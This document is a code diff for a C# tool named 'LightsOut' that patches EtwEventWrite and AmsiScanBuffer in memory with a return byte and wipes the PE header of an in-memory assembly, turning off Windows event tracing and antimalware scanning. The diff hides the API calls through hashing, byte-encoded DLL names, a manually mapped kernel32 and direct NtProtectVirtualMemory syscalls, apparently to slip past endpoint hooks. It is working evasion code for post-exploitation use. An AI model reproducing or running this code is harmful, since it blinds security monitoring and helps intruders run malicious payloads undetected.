@@ -11,6 +11,8 @@ using SpDi2;
 using System.Text;
 using System.Dynamic;
 using System.Runtime.CompilerServices;
+using System.Security.Permissions;
+//using SpDi;
 
 namespace LightsOut
 {
@@ -18,27 +20,37 @@ namespace LightsOut
     {
         static byte[] sixFour = new byte[] { 0xC3 };
         static byte[] eSixFour = new byte[] { 0xC3 };
-
+        
         static Byte[] peHeader = new Byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65 };
 
-        public static void LoEtw(byte[] patch)
+        public static void LoEtw()
         {
             try
             {
                 string decN = Encoding.ASCII.GetString(new byte[] { 110, 116, 100, 108, 108, 46, 100, 108, 108 });
-                //string decW = Encoding.ASCII.GetString(new byte[] { 69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101 });
-
+                
                 String write = Generic.GetAPIHash("EtwEventWrite", 0xfeedfeed);
                 IntPtr pEtw = SpDi2.Generic.GetLibraryAddress(decN, write, 0xfeedfeed, true);
-                Console.WriteLine("[>] evtwrite address: " + string.Format("{0:X}", pEtw.ToInt64()));
-
+                Console.WriteLine("[>] pEtw address: " + string.Format("{0:X}", pEtw.ToInt64()));
+                               
                 uint cOld = 0;
-
-                SpDi2.Win32.VirtualProtect(pEtw, (UIntPtr)eSixFour.Length, 0x40, ref cOld);
                 
+                object[] funcargs =
+                {
+                    pEtw, (IntPtr)eSixFour.Length, (uint)0x40, cOld
+                };
+
+                SpDi.PE.PE_MANUAL_MAP modDet = SpDi.Map.MapModuleToMemory("c:\\Windows\\System32\\kernel32.dll");
+                bool vProtect = (bool)Generic.CallMappedDLLModuleExport(modDet.PEINFO, modDet.ModuleBase, "VirtualProtect", typeof(Win32.Delegates.VirtualProtect), funcargs);
+
                 Marshal.Copy(eSixFour, 0, pEtw, eSixFour.Length);
+                
+                Process currentProcess = Process.GetCurrentProcess();
+                var region = (IntPtr)eSixFour.Length;
+                Native.NtProtectVirtualMemory(currentProcess.Handle, ref pEtw, ref region, 0x20);
+               
             }
-            
+
             catch (System.Exception)
             {
 
@@ -52,23 +64,23 @@ namespace LightsOut
             try
             {
                 string decL = Encoding.ASCII.GetString(new byte[] { 97, 109, 115, 105, 46, 100, 108, 108 });
-                //string decP = Encoding.ASCII.GetString(new byte[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 });
-
+               
                 String cima = Generic.GetAPIHash("AmsiScanBuffer", 0xfeedfeed);
                 IntPtr pIsma = SpDi2.Generic.GetLibraryAddress(decL, cima, 0xfeedfeed, true);
-
                 Console.WriteLine("[>] amcib0ff address(s): " + string.Format("{0:X}", pIsma.ToInt64()));
 
+                Process currentProcess = Process.GetCurrentProcess();
+                var region = (IntPtr)sixFour.Length;
 
-                uint cOld = 0;
-                
-                SpDi2.Win32.VirtualProtect(pIsma, (UIntPtr)sixFour.Length, 0x40, ref cOld);
+                Native.NtProtectVirtualMemory(currentProcess.Handle, ref pIsma, ref region, 0x04);
 
                 Marshal.Copy(sixFour, 0, pIsma, sixFour.Length);
 
-                SpDi2.Win32.VirtualProtect(pIsma, (UIntPtr)sixFour.Length, 0x20, ref cOld);
+                Native.NtProtectVirtualMemory(currentProcess.Handle, ref pIsma, ref region, 0x20);
+
+               
             }
-            
+
             catch (Exception e)
             {
                 Console.WriteLine(" [x] {0}", e.Message);
@@ -78,7 +90,7 @@ namespace LightsOut
 
         public static int LoPEHeader()
         {
-
+            
             uint oldProtect = 0;
             SpDi.Win32.Kernel32.PE_SYSTEM_INFO sys_info = new SpDi.Win32.Kernel32.PE_SYSTEM_INFO();
             SpDi2.Win32.GetSystemInfo(ref sys_info);
@@ -120,7 +132,12 @@ namespace LightsOut
                     virtualQuery(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION)));
                     Console.WriteLine("Execute-Assembly Base Address: 0x{0}", mem_basic_info.BaseAddress.ToString("X"));
 
-                    bool earesult = SpDi2.Win32.VirtualProtect((IntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)SpDi.Win32.Kernel32.MemoryProtectionConsts.READWRITE, ref oldProtect);
+                    IntPtr pSysCall = Generic.GetSyscallStub("NtProtectVirtualMemory");
+                    Console.WriteLine("[>] Ex-Assembly PE pSysCall   : " + String.Format("{0:X}", (pSysCall).ToInt64()));
+                    Native.DELEGATES.NtProtectVirtualMemoryLoPE fSysCallNtProtectVirtualMemory = (Native.DELEGATES.NtProtectVirtualMemoryLoPE)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(Native.DELEGATES.NtProtectVirtualMemoryLoPE));
+                    UInt32 result = fSysCallNtProtectVirtualMemory(currentProcess.Handle, ref mem_basic_info.BaseAddress, ref mem_basic_info.RegionSize, 0x04, ref oldProtect);
+                    Console.WriteLine("[?] Ex-Assembly PE NtProtectVirtualMemory   : " + String.Format("{0:X}", result));
+                    //bool earesult = SpDi2.Win32.VirtualProtect((IntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)SpDi.Win32.Kernel32.MemoryProtectionConsts.READWRITE, ref oldProtect);
 
                     String eafill = Generic.GetAPIHash("RtlFillMemory", 0xfeedfeed);
                     IntPtr eapFunction = Generic.GetLibraryAddress(@"ntdll.dll", eafill, 0xfeedfeed, true);
@@ -139,7 +156,12 @@ namespace LightsOut
                 virtualQuery(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION)));
                 Console.WriteLine("Base Address: 0x{0}", mem_basic_info.BaseAddress.ToString("X"));
 
-                bool result = SpDi2.Win32.VirtualProtect((IntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)SpDi.Win32.Kernel32.MemoryProtectionConsts.READWRITE, ref oldProtect);
+                IntPtr pSysCall = Generic.GetSyscallStub("NtProtectVirtualMemory");
+                Console.WriteLine("[>] PE pSysCall   : " + String.Format("{0:X}", (pSysCall).ToInt64()));
+                Native.DELEGATES.NtProtectVirtualMemoryLoPE fSysCallNtProtectVirtualMemory = (Native.DELEGATES.NtProtectVirtualMemoryLoPE)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(Native.DELEGATES.NtProtectVirtualMemoryLoPE));
+                UInt32 result = fSysCallNtProtectVirtualMemory(currentProcess.Handle, ref mem_basic_info.BaseAddress, ref mem_basic_info.RegionSize, 0x04, ref oldProtect);
+                Console.WriteLine("[?] PE NtProtectVirtualMemory   : " + String.Format("{0:X}", result));
+                //bool result = SpDi2.Win32.VirtualProtect((IntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)SpDi.Win32.Kernel32.MemoryProtectionConsts.READWRITE, ref oldProtect);
 
                 String fill = Generic.GetAPIHash("RtlFillMemory", 0xfeedfeed);
                 IntPtr pFunction = Generic.GetLibraryAddress(@"ntdll.dll", fill, 0xfeedfeed, true);
